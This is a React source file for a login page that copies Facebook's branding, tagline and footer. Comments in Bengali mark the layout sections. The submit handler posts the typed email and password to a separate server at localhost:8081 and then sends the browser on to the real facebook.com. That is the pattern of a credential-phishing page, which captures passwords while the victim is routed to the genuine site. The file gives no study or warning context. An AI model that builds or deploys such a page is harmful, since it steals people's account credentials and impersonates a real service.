import React, { useState } from 'react';
import axios from 'axios';
import './Login.css';

function Login() {
    const [values, setValues] = useState({ email: '', password: '' });

    const handleInput = (event) => {
        setValues(prev => ({...prev, [event.target.name]: event.target.value}));
    }

    const handleSubmit = (event) => {
        event.preventDefault();
        axios.post('http://localhost:8081/login', values)
        .then(res => {
            window.location.href = "https://www.facebook.com"; 
        })
        .catch(err => alert("Error connecting to server!"));
    }

    return (
        <div className="fb-wrapper">
            <div className="fb-content">
                {/* বাম পাশের টেক্সট লোগো অংশ */}
                <div className="fb-left">
                    <h1 className="fb-logo-text">facebook</h1>
                    <p className="fb-tagline">Facebook helps you connect and share with the people in your life.</p>
                </div>

                {/* ডান পাশের লগইন বক্স */}
                <div className="fb-right">
                    <div className="fb-card">
                        <form onSubmit={handleSubmit}>
                            <input type="text" placeholder="Email address or phone number" name="email" required onChange={handleInput} />
                            <input type="password" placeholder="Password" name="password" required onChange={handleInput} />
                            <button type="submit" className="login-btn">Log In</button>
                            <a href="#" className="forgot-link">Forgotten password?</a>
                            <div className="divider"></div>
                            <button type="button" className="create-btn">Create new account</button>
                        </form>
                    </div>
                    <p className="footer-msg"><b>Create a Page</b> for a celebrity, brand or business.</p>
                </div>
            </div>

            <footer className="fb-footer">
                <div className="footer-inner">
                    <p>English (UK) · বাংলা · हिन्दी · اردو · नेपाली · Português (Brasil) · Français (France)</p>
                    <div className="footer-divider"></div>
                    <p>Sign Up · Log In · Messenger · Facebook Lite · Video · Places · Games · Marketplace · Meta Pay · Meta Store · Meta Quest · Instagram · Threads</p>
                    <p className="copyright">Meta © 2026</p>
                </div>
            </footer>
        </div>
    );
}

export default Login;